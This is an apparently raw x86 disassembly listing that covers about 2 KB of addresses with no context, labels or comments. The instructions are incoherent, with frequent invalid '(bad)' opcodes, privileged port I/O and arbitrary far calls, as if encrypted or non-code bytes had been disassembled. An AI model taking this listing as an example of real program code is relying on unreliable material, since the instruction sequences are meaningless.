  406849:	imul   ecx,edi,0xffffff80
  40684c:	mov    ds:0xbd01ec10,eax
  406851:	adc    eax,0x5d2a8616
  406856:	es out dx,al
  406858:	sbb    eax,0x197847a1
  40685d:	fnsave [edi]
  40685f:	nop
  406860:	sub    BYTE PTR [eax+edi*1+0x2591d86a],cl
  406867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406868:	jae    0x4068ad
  40686a:	adc    esi,eax
  40686c:	fist   WORD PTR [edi]
  40686e:	dec    edx
  40686f:	mov    ch,0xca
  406871:	mov    eax,ds:0xd2ae68be
  406876:	fldcw  WORD PTR [edx+esi*2-0x52be3f1e]
  40687d:	adc    dl,BYTE PTR [esi]
  40687f:	pusha  
  406880:	in     al,dx
  406881:	jecxz  0x40680b
  406883:	test   BYTE PTR ds:0xacfcaa7d,dh
  406889:	into   
  40688a:	xchg   ebx,eax
  40688b:	pop    es
  40688c:	les    eax,FWORD PTR [bp+di]
  40688f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406890:	sub    eax,0x12c7fd6f
  406895:	imul   WORD PTR [esi-0x4e]
  406899:	rcr    DWORD PTR [esi-0x7d73d8f3],1
  40689f:	ret    
  4068a0:	repnz in eax,dx
  4068a2:	or     DWORD PTR ds:0x2f2e3287,esp
  4068a8:	call   FWORD PTR [ecx-0x69]
  4068ab:	sub    BYTE PTR [edi+0x62],dl
  4068ae:	mov    ebx,0xc893b7ae
  4068b3:	push   edx
  4068b4:	js     0x406849
  4068b6:	call   0x7e20:0xb84f3b24
  4068bd:	xchg   ebx,eax
  4068be:	dec    ebx
  4068bf:	mov    cs,WORD PTR [esi-0x2f]
  4068c2:	aas    
  4068c3:	mov    esp,0xd3bdc186
  4068c8:	xchg   edi,eax
  4068c9:	sti    
  4068ca:	mov    al,0x9e
  4068cc:	or     DWORD PTR [edi-0x122a4c45],ebp
  4068d2:	lock outs dx,DWORD PTR ds:[esi]
  4068d4:	mov    ?,ecx
  4068d6:	or     BYTE PTR ds:0x7280be71,dh
  4068dc:	cs pop es
  4068de:	arpl   WORD PTR [ecx-0x65445bb8],di
  4068e4:	adc    BYTE PTR ds:[esi],dl
  4068e7:	in     al,0x9b
  4068e9:	cdq    
  4068ea:	xor    BYTE PTR [eax-0x6e],dl
  4068ed:	mov    eax,ds:0xd55ccb99
  4068f2:	fst    QWORD PTR [edx+0x4c7e4fa4]
  4068f8:	aaa    
  4068f9:	add    eax,0xf29b2d52
  4068fe:	outs   dx,BYTE PTR ds:[esi]
  4068ff:	mov    ebp,0x4244b46
  406904:	add    DWORD PTR [edi-0x5b],ebx
  406907:	int3   
  406908:	push   es
  406909:	add    bl,ah
  40690b:	mov    esp,0x6cfaab6a
  406910:	mov    esi,DWORD PTR [eax+0x42]
  406913:	add    DWORD PTR [ebx+0x10],esp
  406916:	(bad)  
  406917:	and    eax,0x2e13490e
  40691c:	arpl   si,ax
  40691e:	jno    0x406980
  406920:	stos   BYTE PTR es:[edi],al
  406921:	lods   al,BYTE PTR ds:[esi]
  406922:	or     eax,0x75d38908
  406927:	adc    ecx,DWORD PTR [ebp+0x14]
  40692a:	xchg   ecx,eax
  40692b:	or     al,0x71
  40692d:	pusha  
  40692e:	sub    BYTE PTR [ecx],cl
  406930:	push   eax
  406931:	cmp    dl,0x5e
  406934:	out    0xc4,al
  406936:	arpl   WORD PTR [ebx+0x4d076182],bp
  40693c:	enter  0xf01d,0x23
  406940:	add    al,0xc4
  406942:	sbb    DWORD PTR [esi],esp
  406944:	ins    BYTE PTR es:[edi],dx
  406945:	mov    esi,DWORD PTR [esi-0x1]
  406948:	xor    al,0xed
  40694a:	popa   
  40694b:	imul   edi,edx,0x6fe57adc
  406951:	loop   0x406946
  406953:	xor    esi,ecx
  406955:	sar    BYTE PTR [ebp+0x1c7ff803],cl
  40695b:	pusha  
  40695c:	dec    ecx
  40695d:	outs   dx,BYTE PTR ds:[esi]
  40695e:	mul    BYTE PTR [eax-0x6b]
  406961:	repnz arpl WORD PTR [eax-0x77],bx
  406965:	outs   dx,DWORD PTR ds:[esi]
  406966:	js     0x40692b
  406968:	push   eax
  406969:	mov    edx,0x22edb558
  40696e:	arpl   WORD PTR [edx-0x24],cx
  406971:	retf   
  406972:	add    eax,0x5b40a6a
  406977:	mov    ah,0x5e
  406979:	sub    ebx,ebx
  40697b:	pop    ebp
  40697c:	mov    bh,BYTE PTR [edi]
  40697e:	mov    dh,0x8f
  406980:	mov    BYTE PTR [esi+0x8],bl
  406983:	outs   dx,DWORD PTR ds:[esi]
  406985:	dec    esi
  406986:	pop    esp
  406987:	loopne 0x40693e
  406989:	adc    eax,0xc757d033
  40698e:	(bad)  
  40698f:	out    dx,eax
  406990:	xor    al,0xc
  406992:	jno    0x40698f
  406994:	adc    esp,DWORD PTR [esp+edi*4+0xef60506]
  40699b:	es cs add eax,0x181fbe4b
  4069a2:	loop   0x40699b
  4069a4:	int3   
  4069a5:	in     eax,0x49
  4069a7:	dec    esp
  4069a8:	push   edi
  4069a9:	sbb    eax,0xae88220c
  4069ae:	mov    eax,0xc8533a1b
  4069b3:	sbb    DWORD PTR [ebp+edx*4-0x604ccb83],0xe51bc3db
  4069be:	xchg   DWORD PTR [edi],edi
  4069c0:	jl     0x4069ea
  4069c2:	test   cl,ah
  4069c4:	pop    edi
  4069c5:	stos   BYTE PTR es:[edi],al
  4069c6:	lock jne 0x406a29
  4069c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ca:	mov    BYTE PTR [esi-0x21],0xf2
  4069ce:	xchg   esp,eax
  4069cf:	adc    DWORD PTR [esi-0x6400034c],edi
  4069d5:	jecxz  0x4069e7
  4069d7:	jnp    0x406970
  4069d9:	pop    ds
  4069da:	sbb    ah,BYTE PTR [ecx]
  4069dc:	pop    esp
  4069dd:	mov    eax,0xc5b13d66
  4069e2:	inc    edx
  4069e3:	lea    edx,ds:[ebp-0x63]
  4069e7:	imul   ecx,esi,0xbdf03a3f
  4069ed:	inc    ebx
  4069ee:	pop    edx
  4069ef:	mov    al,ds:0xecd84606
  4069f4:	arpl   WORD PTR [edi+0x69],cx
  4069f7:	fild   QWORD PTR [esi-0x387b6a3b]
  4069fd:	add    BYTE PTR [edx],ch
  4069ff:	mov    bh,0x98
  406a01:	shr    DWORD PTR [esi-0x61849fc],cl
  406a07:	pop    es
  406a08:	mov    ecx,DWORD PTR [edi-0x6d]
  406a0b:	and    eax,0x1ec21fa6
  406a10:	gs sahf 
  406a12:	sub    ecx,ebx
  406a14:	xor    eax,0x41ea611b
  406a19:	dec    edx
  406a1a:	popf   
  406a1b:	mov    ds:0xdd764472,eax
  406a20:	xchg   esi,eax
  406a21:	pop    ds
  406a22:	cli    
  406a23:	sbb    cl,BYTE PTR [eax+0x7ec147e1]
  406a29:	call   0x7217:0xdb2ef782
  406a30:	or     al,0x7a
  406a32:	dec    eax
  406a33:	test   eax,0xe1e9a633
  406a38:	cmp    al,0xdd
  406a3a:	loope  0x4069df
  406a3c:	aas    
  406a3d:	dec    ebx
  406a3e:	mov    ch,BYTE PTR [edx-0x5a33c52f]
  406a44:	pop    es
  406a45:	or     al,0x98
  406a47:	xchg   ebx,eax
  406a48:	popa   
  406a49:	push   edx
  406a4a:	xchg   edx,eax
  406a4b:	out    dx,al
  406a4c:	mov    esi,0xec184904
  406a51:	xchg   esi,eax
  406a52:	add    eax,0x9bad52f2
  406a57:	test   al,0x24
  406a59:	test   al,0x7b
  406a5b:	xlat   BYTE PTR ds:[ebx]
  406a5c:	jp     0x406a3d
  406a5e:	dec    edi
  406a5f:	mov    WORD PTR [edx+0x2f26a505],cs
  406a65:	jge    0x4069ee
  406a67:	mov    DWORD PTR [edx+0x45296d0a],esp
  406a6d:	sti    
  406a6e:	(bad)  
  406a6f:	je     0x406a88
  406a71:	cmc    
  406a72:	fisttp QWORD PTR [ecx-0x79]
  406a75:	pop    ebp
  406a76:	iret   
  406a77:	xchg   edx,eax
  406a78:	loop   0x406a78
  406a7a:	xchg   ebp,eax
  406a7b:	sub    ebx,DWORD PTR [eax]
  406a7d:	js     0x406a72
  406a7f:	into   
  406a80:	lds    ebx,FWORD PTR [ebp+0x1f425fbe]
  406a86:	push   eax
  406a87:	out    dx,al
  406a88:	add    BYTE PTR [edx+0x77],ch
  406a8b:	push   cs
  406a8c:	xor    al,0xa4
  406a8e:	adc    DWORD PTR [ebx],0xffffff8f
  406a91:	js     0x406ab1
  406a93:	cmp    BYTE PTR [ebx+ecx*4+0x4bd4b43c],bl
  406a9a:	cdq    
  406a9b:	mov    ds:0xdf906e1f,eax
  406aa0:	mov    ds:0x5cff756b,eax
  406aa5:	dec    ecx
  406aa6:	jmp    0x406a7b
  406aa8:	mov    ah,0xc8
  406aaa:	cmp    al,0x19
  406aac:	inc    esi
  406aad:	mov    edx,0x91b348ef
  406ab2:	xchg   edi,eax
  406ab3:	dec    edi
  406ab4:	jecxz  0x406a74
  406ab6:	test   BYTE PTR [ecx+0x2e],cl
  406ab9:	inc    esp
  406aba:	cdq    
  406abb:	sbb    DWORD PTR [ecx-0x6908a9b2],ecx
  406ac1:	pop    ecx
  406ac2:	fistp  QWORD PTR [ecx-0x15abb2bb]
  406ac8:	mov    DWORD PTR [esi+0x48],ebx
  406acb:	es ret 
  406acd:	xchg   edx,eax
  406ace:	pop    esp
  406acf:	mov    BYTE PTR [esi+eax*1-0x3c052c3f],bl
  406ad6:	xor    BYTE PTR [ecx+0x671e0b],ah
  406adc:	call   0x472a:0xe4910d25
  406ae3:	pop    ecx
  406ae4:	sbb    BYTE PTR [ebx-0x31],bl
  406ae7:	hlt    
  406ae8:	cmp    edi,DWORD PTR [edx+0x59]
  406aeb:	sbb    eax,0xf64739ba
  406af0:	lock pushf 
  406af2:	mov    bl,BYTE PTR [edx+edx*2+0x557d9e88]
  406af9:	mov    bl,0xc9
  406afb:	or     cl,BYTE PTR [ebx]
  406afd:	popa   
  406afe:	sbb    al,0xad
  406b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b01:	xchg   ebp,eax
  406b02:	ss loopne 0x406ade
  406b05:	dec    eax
  406b06:	push   ebp
  406b07:	jmp    FWORD PTR [ebx]
  406b09:	sub    edx,edi
  406b0b:	pop    ds
  406b0c:	mov    esi,0x852d803
  406b11:	pop    ebx
  406b12:	fucomi st,st(1)
  406b14:	push   edi
  406b15:	push   ebx
  406b16:	icebp  
  406b17:	repz pop edx
  406b19:	dec    ecx
  406b1a:	push   edx
  406b1b:	fdivr  st,st(1)
  406b1d:	(bad)  
  406b1e:	fistp  DWORD PTR [ebx]
  406b20:	mov    al,0x6c
  406b22:	pushf  
  406b23:	scas   al,BYTE PTR es:[edi]
  406b24:	(bad)  
  406b26:	in     al,dx
  406b27:	jbe    0x406b89
  406b29:	aad    0x2a
  406b2b:	inc    edi
  406b2c:	daa    
  406b2d:	out    0x47,al
  406b2f:	cmp    dl,BYTE PTR ds:0x74fe448e
  406b35:	jb     0x406b96
  406b37:	dec    esi
  406b38:	mov    al,0x9d
  406b3a:	rol    DWORD PTR [edx+0xef9600],0xd8
  406b41:	pop    ds
  406b42:	frstor ss:[eax]
  406b45:	xor    BYTE PTR ds:0x3863def6,dl
  406b4b:	cs adc al,0xb6
  406b4e:	loopne 0x406bbb
  406b50:	adc    eax,0x432935a6
  406b55:	pop    eax
  406b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b57:	or     dh,BYTE PTR [ecx]
  406b59:	cli    
  406b5a:	popa   
  406b5b:	repz pop esp
  406b5d:	inc    edi
  406b5e:	pop    esp
  406b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b60:	push   ebx
  406b61:	ins    DWORD PTR es:[edi],dx
  406b62:	in     al,0x99
  406b64:	fwait
  406b65:	jmp    0x9ebe43db
  406b6a:	mov    al,0xa9
  406b6c:	xchg   ecx,eax
  406b6d:	ret    0xdb33
  406b70:	jo     0x406bda
  406b72:	xor    BYTE PTR [eax+0x1d],ah
  406b75:	cli    
  406b76:	lea    ecx,[ecx]
  406b78:	out    0x2d,eax
  406b7a:	je     0x406b18
  406b7c:	or     ebx,DWORD PTR [ecx+0x6c]
  406b7f:	(bad)  
  406b80:	dec    ecx
  406b81:	aam    0xe6
  406b83:	cs pop edi
  406b85:	mov    DWORD PTR [ecx+0x1c],ecx
  406b88:	aad    0x41
  406b8a:	and    DWORD PTR [edx],0x15
  406b8d:	fwait
  406b8e:	push   0xffffff80
  406b90:	shr    DWORD PTR [ecx-0x28],1
  406b93:	or     cl,BYTE PTR [eax+ecx*1+0x59536a2c]
  406b9a:	push   ss
  406b9b:	or     edx,esi
  406b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9e:	jmp    0x3fa6:0x90cb4365
  406ba5:	jns    0x406b97
  406ba7:	inc    edx
  406ba8:	aaa    
  406ba9:	push   es
  406baa:	into   
  406bab:	add    eax,DWORD PTR [eax-0x13]
  406bae:	jns    0x406b80
  406bb0:	shl    BYTE PTR [eax],cl
  406bb2:	bndstx [eax],bnd3
  406bb5:	sub    ecx,ebp
  406bb7:	xor    ah,cl
  406bb9:	fidiv  WORD PTR [ebx-0x233125f]
  406bbf:	pop    eax
  406bc0:	int    0xe4
  406bc2:	dec    ebx
  406bc3:	test   eax,0x2af3e1f3
  406bc8:	cmp    edx,edx
  406bca:	in     eax,dx
  406bcb:	lea    edx,[ebx+0xf]
  406bce:	idiv   DWORD PTR [edx-0x11]
  406bd1:	push   esi
  406bd2:	xchg   esp,eax
  406bd3:	sbb    ebp,DWORD PTR [edx+0x1]
  406bd6:	(bad)  
  406bd7:	call   0xd785:0xeee0e68e
  406bde:	ds push 0xec59c4ae
  406be4:	aam    0xc7
  406be6:	ins    DWORD PTR es:[edi],dx
  406be7:	dec    edx
  406be8:	lods   al,BYTE PTR ds:[esi]
  406be9:	pop    esi
  406bea:	mov    ch,0xe
  406bec:	xchg   BYTE PTR ds:0xa2ee6b94,dl
  406bf2:	test   DWORD PTR [ebx],ecx
  406bf4:	rcl    dl,0x3a
  406bf7:	mov    ch,al
  406bf9:	aam    0xd6
  406bfb:	xchg   edi,eax
  406bfc:	push   ecx
  406bfd:	adc    ebp,ebp
  406bff:	push   0x30
  406c01:	jp     0x406b9c
  406c03:	fndisi(8087 only) 
  406c05:	adc    al,0xc7
  406c07:	rcl    DWORD PTR [esi],0x3b
  406c0a:	mov    ebx,0xc6996a3e
  406c0f:	add    al,0x1a
  406c11:	push   edx
  406c12:	inc    esi
  406c13:	or     ebp,DWORD PTR [esi]
  406c15:	shl    bh,0x34
  406c18:	push   edx
  406c19:	sti    
  406c1a:	enter  0x2923,0x92
  406c1e:	call   FWORD PTR [ebx+0x58]
  406c21:	xchg   DWORD PTR [edx-0x65],ebp
  406c24:	mov    BYTE PTR [ecx+0x2e00f5b0],0xd3
  406c2b:	dec    eax
  406c2c:	ss gs dec esi
  406c2f:	or     ecx,edx
  406c31:	out    0x41,al
  406c33:	and    dh,BYTE PTR [esi]
  406c35:	cwde   
  406c36:	or     eax,0x378cb35f
  406c3b:	push   ebx
  406c3c:	shl    BYTE PTR [edx+esi*1-0x484f8b94],0xb
  406c44:	mov    gs,WORD PTR [edx+0xe]
  406c47:	xchg   DWORD PTR ds:0x1b4beeb0,edi
  406c4d:	mov    ebp,DWORD PTR [eax-0x36f38e2d]
  406c53:	clc    
  406c54:	outs   dx,DWORD PTR ds:[esi]
  406c55:	mov    BYTE PTR [eax+0x3d0e73b7],cl
  406c5b:	and    DWORD PTR [edi+0x2f9bca01],edi
  406c61:	sbb    ecx,DWORD PTR [edx-0x1fe4350f]
  406c67:	stos   BYTE PTR es:[edi],al
  406c68:	cmp    DWORD PTR [ecx],esi
  406c6a:	mov    ah,BYTE PTR ds:0x4cb3247a
  406c70:	out    dx,eax
  406c71:	cmp    DWORD PTR [ecx-0x18ebe2e9],ebx
  406c77:	or     al,0x5c
  406c79:	out    dx,eax
  406c7a:	(bad)  
  406c7b:	(bad)  
  406c7c:	mov    ebp,esi
  406c7e:	jns    0x406cd1
  406c80:	inc    edi
  406c81:	sub    edi,DWORD PTR cs:[ebp-0x7d]
  406c85:	pusha  
  406c86:	pop    edi
  406c87:	pop    ds
  406c88:	js     0x406c58
  406c8a:	rol    ecx,0xb
  406c8d:	ret    
  406c8e:	xor    ebx,eax
  406c90:	mov    ecx,0x71015790
  406c95:	mov    ds,WORD PTR [eax+ebx*8]
  406c98:	in     al,0x63
  406c9a:	popf   
  406c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c9c:	arpl   WORD PTR [ecx-0x1f],si
  406c9f:	jae    0x406c43
  406ca1:	sub    ch,BYTE PTR [ecx]
  406ca3:	lock mov BYTE PTR [ebx-0x2802eeb6],bl
  406caa:	sub    ecx,DWORD PTR [eax]
  406cac:	aad    0x81
  406cae:	jmp    0x6611:0x1e920b60
  406cb5:	sub    bl,ch
  406cb7:	out    dx,al
  406cb8:	push   es
  406cb9:	jmp    0x653d:0x2daf573f
  406cc0:	add    BYTE PTR [ecx],bh
  406cc2:	push   ecx
  406cc3:	mov    edx,DWORD PTR [ebx+edi*8]
  406cc6:	cli    
  406cc7:	and    esp,DWORD PTR [edi]
  406cc9:	xchg   esp,eax
  406cca:	pop    es
  406ccb:	mov    al,ds:0xd17de194
  406cd0:	or     DWORD PTR [eax+0x4695513b],edi
  406cd6:	das    
  406cd7:	cs mov ebp,0xc535fa1e
  406cdd:	sbb    eax,0x14e85786
  406ce2:	push   dx
  406ce4:	mov    edx,0x4a49cc4c
  406ce9:	icebp  
  406cea:	fadd   st,st(5)
  406cec:	arpl   WORD PTR [edx-0x50],sp
  406cef:	imul   ebp,DWORD PTR [edx+ebx*2],0x2d
  406cf3:	stos   BYTE PTR es:[edi],al
  406cf4:	mov    ebx,0x636d1bfe
  406cf9:	mov    bl,0xd0
  406cfb:	int3   
  406cfc:	int    0x9e
  406cfe:	popf   
  406cff:	push   ecx
  406d00:	mov    bh,0xdd
  406d02:	(bad)  
  406d03:	sub    bh,al
  406d05:	adc    dh,BYTE PTR [esi]
  406d07:	mov    al,0xf8
  406d09:	dec    ebp
  406d0a:	push   ecx
  406d0b:	cmp    DWORD PTR [esi-0x7416165],ebx
  406d11:	mov    al,ds:0xc64cee7e
  406d16:	mul    BYTE PTR [esi]
  406d18:	push   ecx
  406d19:	(bad)  
  406d1a:	jp     0x406d10
  406d1c:	fisttp QWORD PTR [eax+edi*2+0x111bf74b]
  406d23:	push   esp
  406d24:	out    0xb5,al
  406d26:	inc    esp
  406d27:	in     al,dx
  406d28:	fcmovu st,st(3)
  406d2a:	mov    dh,0x31
  406d2c:	add    dh,BYTE PTR [edi+0x6e2e08af]
  406d32:	gs push esp
  406d34:	lock push 0xf1c46f4d
  406d3a:	addr16 repnz call 0xc763:0x888009a7
  406d43:	add    eax,0x51673a50
  406d48:	fnstenv [ecx]
  406d4a:	cs retf 
  406d4c:	pop    ebp
  406d4d:	mov    edx,0xa51a0e5e
  406d52:	sbb    dh,BYTE PTR [edx-0x677d96c9]
  406d58:	mov    ch,0x5b
  406d5a:	jo     0x406d5f
  406d5c:	nop
  406d5d:	xor    eax,0xa9218383
  406d62:	pushf  
  406d63:	adc    DWORD PTR [edx+eax*2+0x6eef1359],edx
  406d6a:	in     eax,dx
  406d6b:	fnstcw WORD PTR [ecx+0x38]
  406d6e:	data16 out dx,al
  406d70:	aam    0x3c
  406d72:	pop    eax
  406d73:	sbb    al,0x1
  406d75:	jle    0x406dc5
  406d77:	ret    0x45f3
  406d7a:	scas   eax,DWORD PTR es:[edi]
  406d7b:	xchg   ebp,eax
  406d7c:	mov    bl,0x7a
  406d7e:	aam    0xce
  406d80:	nop
  406d81:	pushf  
  406d82:	call   0x26b8:0xe14f4e06
  406d89:	xor    cl,BYTE PTR [edx-0x12]
  406d8c:	xchg   ecx,eax
  406d8d:	mov    WORD PTR [edx],?
  406d8f:	and    DWORD PTR [esi+eax*8+0x4116a1b2],0x771adc36
  406d9a:	add    ah,BYTE PTR [edi+edi*2+0x4a]
  406d9e:	push   esp
  406d9f:	jg     0x406d5f
  406da1:	and    BYTE PTR [ecx+0x2a],bl
  406da4:	pop    esi
  406da5:	sub    DWORD PTR [ebx-0x41],esi
  406da8:	xchg   esi,eax
  406da9:	mov    edx,0x141f80a
  406dae:	mov    ah,0x79
  406db0:	addr16 call 0xe946fc57
  406db6:	call   0x2d28:0x38656900
  406dbd:	pop    ds
  406dbe:	(bad)  
  406dbf:	(bad)
  406dc3:	sbb    bl,BYTE PTR [ecx-0x649a3aeb]
  406dc9:	jl     0x406d4c
  406dcb:	adc    edi,DWORD PTR [ecx]
  406dcd:	mov    edi,0xe3eed3de
  406dd2:	das    
  406dd3:	dec    esp
  406dd4:	xor    al,0xd9
  406dd6:	mov    ebx,0x280991e3
  406ddb:	xor    al,0xf
  406ddd:	retf   
  406dde:	mov    dl,BYTE PTR [ebp-0x68]
  406de1:	cmp    dh,BYTE PTR [esp+eax*2+0x16]
  406de5:	call   0xfce6f92
  406dea:	sar    esi,1
  406dec:	and    DWORD PTR [eax+ecx*4],edx
  406def:	push   0xfffffff4
  406df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df2:	cmp    DWORD PTR [edi],0xffffff84
  406df5:	mov    ebx,0xa462f30c
  406dfa:	imul   ebp,DWORD PTR [esi+0x7fdd6d36],0xffffffbd
  406e01:	mov    ah,0x1e
  406e03:	sbb    cl,BYTE PTR [edx]
  406e05:	and    DWORD PTR [edi-0x755b4ea5],0x3334ef2e
  406e0f:	mov    cl,BYTE PTR ds:0x47d55e0f
  406e15:	mov    edi,edi
  406e17:	cmp    edi,DWORD PTR ds:0xdb07fc51
  406e1d:	fs loop 0x406e1d
  406e20:	mov    ch,0x6e
  406e22:	xor    BYTE PTR [edi-0x66],0x30
  406e26:	rol    BYTE PTR [ebp-0x46],1
  406e29:	or     ebp,DWORD PTR [esi]
  406e2b:	pop    es
  406e2c:	fisttp QWORD PTR [ebp+0x7a]
  406e2f:	jg     0x406db9
  406e31:	ins    BYTE PTR es:[edi],dx
  406e32:	xchg   ebx,eax
  406e33:	add    cl,al
  406e35:	and    edx,ebp
  406e37:	pminsw mm6,QWORD PTR [esi-0x4]
  406e3b:	in     al,dx
  406e3c:	jle    0x406dcd
  406e3e:	out    0x83,eax
  406e40:	test   al,ah
  406e42:	sbb    al,0x8c
  406e44:	mov    edx,0x1e89f2cf
  406e49:	push   DWORD PTR [ecx]
  406e4b:	mov    eax,0xa35c4a40
  406e50:	loop   0x406dd6
  406e52:	sub    eax,0xf1d04284
  406e57:	stos   BYTE PTR es:[edi],al
  406e58:	cmp    DWORD PTR [ebx-0x1c],ecx
  406e5b:	sub    edi,DWORD PTR [ebx+0x36aa1918]
  406e61:	sbb    esp,DWORD PTR [ebp+0x1f]
  406e64:	xor    eax,edi
  406e66:	call   0x883cf159
  406e6b:	js     0x406df4
  406e6d:	fs pop ss
  406e6f:	mov    ebp,?
  406e71:	fs push esi
  406e73:	mov    al,ds:0xdb6cf3d4
  406e78:	sbb    eax,0x282b5e5
  406e7d:	nop
  406e7e:	pop    ds
  406e7f:	rcl    DWORD PTR [edi-0x1a],0x57
  406e83:	mov    bh,0x2d
  406e85:	and    DWORD PTR [esp+ebx*4-0x9096089],esi
  406e8c:	adc    BYTE PTR [edi+0x4357e9f6],al
  406e92:	cmp    edx,ecx
  406e94:	(bad)  
  406e95:	pushf  
  406e96:	cmp    DWORD PTR [ebp-0x7ccba2c3],eax
  406e9c:	push   0xffffffa6
  406e9e:	dec    ebp
  406e9f:	xchg   esp,eax
  406ea0:	mov    WORD PTR [edi+ebp*2-0x34],gs
  406ea4:	xor    al,0x51
  406ea6:	xor    eax,0x855c2f4b
  406eab:	mov    dl,0xc
  406ead:	je     0x406e46
  406eaf:	xchg   ecx,eax
  406eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eb1:	inc    BYTE PTR [ebx+0x7e7bf376]
  406eb7:	pop    ss
  406eb8:	stc    
  406eb9:	xchg   ecx,eax
  406eba:	sub    ah,ch
  406ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebd:	inc    esi
  406ebe:	xchg   ecx,eax
  406ebf:	xor    eax,DWORD PTR [esi+0x5454d46e]
  406ec5:	lea    edi,[eax+edi*1+0x5f]
  406ec9:	add    dh,al
  406ecb:	xchg   DWORD PTR [esi+0x8723c6f],ecx
  406ed1:	arpl   WORD PTR [ebp-0x2ccc8ab3],ax
  406ed7:	add    ecx,DWORD PTR [ecx+0x61]
  406eda:	jns    0x406f4e
  406edc:	mov    esi,0xf1eee666
  406ee1:	cmp    al,bh
  406ee3:	std    
  406ee4:	sar    edx,1
  406ee6:	mov    cl,dl
  406ee8:	nop
  406ee9:	pop    ecx
  406eea:	or     esp,DWORD PTR [eax-0x67069ad0]
  406ef0:	mov    esi,0xb6da06c5
  406ef5:	mov    esi,0x936ee7ea
  406efa:	mov    dl,0x5
  406efc:	xchg   BYTE PTR [ebp-0x779c6f7d],dl
  406f02:	pushf  
  406f03:	test   DWORD PTR [eax+0x4c5f564b],edx
  406f09:	test   DWORD PTR [ebp+0x17],ebx
  406f0c:	add    eax,DWORD PTR ds:0xf933eaba
  406f12:	inc    edi
  406f13:	addr16 loop 0x406f4b
  406f16:	loopne 0x406f2e
  406f18:	or     eax,DWORD PTR [ebp+0x27dbbe5c]
  406f1e:	pop    edi
  406f1f:	les    esi,FWORD PTR [esi+0x5a]
  406f22:	hlt    
  406f23:	cs mov ebp,0x4796ca26
  406f29:	fcom   DWORD PTR [ecx]
  406f2b:	adc    dh,BYTE PTR [edx-0x3433c9d2]
  406f31:	out    0xea,eax
  406f33:	push   edi
  406f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f35:	or     edx,DWORD PTR [esi-0x4f8524a3]
  406f3b:	repnz pop edx
  406f3d:	test   DWORD PTR [esi-0x2e90c72b],esi
  406f43:	sbb    edi,esi
  406f45:	inc    eax
  406f46:	inc    ebp
  406f47:	push   edi
  406f48:	je     0x406ed6
  406f4a:	aas    
  406f4b:	and    bl,BYTE PTR [edi+0x13]
  406f4e:	mov    esi,DWORD PTR [ebx-0x43215966]
  406f54:	mov    ebx,0x55c14f2
  406f59:	xchg   ebx,eax
  406f5a:	xor    edx,DWORD PTR [ebx]
  406f5c:	adc    al,0x7c
  406f5e:	loopne 0x406f34
  406f60:	fsubr  st(7),st
  406f62:	push   ds
  406f63:	imul   ecx,DWORD PTR [ecx+0x65],0x3bbfc267
  406f6a:	jl     0x406fc4
  406f6c:	add    DWORD PTR [ecx+0x19c95c],edx
  406f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f73:	aad    0xd6
  406f75:	popa   
  406f76:	push   ecx
  406f77:	imul   esi,DWORD PTR [ecx],0x34b790cc
  406f7d:	sbb    edi,ecx
  406f7f:	cmp    al,0xf4
  406f81:	dec    eax
  406f82:	dec    edx
  406f83:	pop    esp
  406f84:	jno    0x406f72
  406f86:	(bad)  
  406f87:	stos   BYTE PTR es:[edi],al
  406f88:	addr16 (bad) 
  406f8b:	seto   BYTE PTR [ecx]
  406f8e:	and    eax,0x7135b246
  406f93:	aad    0x6b
  406f95:	or     ecx,DWORD PTR [ecx-0x11]
  406f98:	leave  
  406f99:	mov    edi,0x6150939c
  406f9e:	cmp    ecx,eax
  406fa0:	jb     0x406f7e
  406fa2:	cmp    DWORD PTR ds:0xb8d32a6e,edi
  406fa8:	adc    DWORD PTR [edx+0x4],esi
  406fab:	(bad)  
  406fac:	lds    esi,FWORD PTR [esi]
  406fae:	cld    
  406faf:	xchg   esi,eax
  406fb0:	test   DWORD PTR [ecx],0xa290b5ed
  406fb6:	mov    bh,0xe1
  406fb8:	xchg   edx,eax
  406fb9:	sbb    al,0x9d
  406fbb:	push   cs
  406fbc:	jmp    0xa00cdf61
  406fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc2:	mov    eax,ebx
  406fc4:	test   al,0xd7
  406fc6:	xchg   esi,eax
  406fc7:	jns    0x40701d
  406fc9:	mov    dl,0x2a
  406fcb:	cwde   
  406fcc:	test   DWORD PTR [esi+ebx*1+0x15d3094c],esp
  406fd3:	jmp    0x6ff8:0xf6f76a99
  406fda:	(bad)  [ebx+0x11]
  406fdd:	repnz inc ecx
  406fdf:	es popa 
  406fe1:	fistp  WORD PTR [edi+0x7f]
  406fe4:	add    al,0xcb
  406fe6:	in     al,0x93
  406fe8:	mov    DWORD PTR [ecx+edx*2+0x428dae53],ebp
  406fef:	xchg   edx,eax
  406ff0:	mov    esp,esi
  406ff2:	adc    edx,eax
  406ff4:	into   
  406ff5:	and    DWORD PTR [esi+0xa],eax
  406ff8:	dec    esi
  406ff9:	xor    bl,dl
  406ffb:	mov    ebp,0x1b20a888
  407000:	xchg   DWORD PTR [edi-0x193f7d67],ebx
  407006:	fmul   QWORD PTR [ebx]
  407008:	lods   eax,DWORD PTR ds:[esi]
  407009:	mov    ebx,0x7c6bd4ad
  40700e:	add    dl,BYTE PTR [edi-0x58]
  407011:	sar    BYTE PTR [ecx],0x92
  407014:	retf   
  407015:	push   ebp
  407016:	or     edi,DWORD PTR [edi+0x2d]
  407019:	out    0xf0,al
  40701b:	lods   al,BYTE PTR ds:[esi]
  40701c:	daa    
  40701d:	sub    cl,BYTE PTR [ecx]
  40701f:	add    DWORD PTR ds:0xfe2b110f,ecx
  407025:	loop   0x407014
  407027:	fisub  WORD PTR [ecx+0x3383c466]
  40702d:	stc    
  40702e:	(bad)  
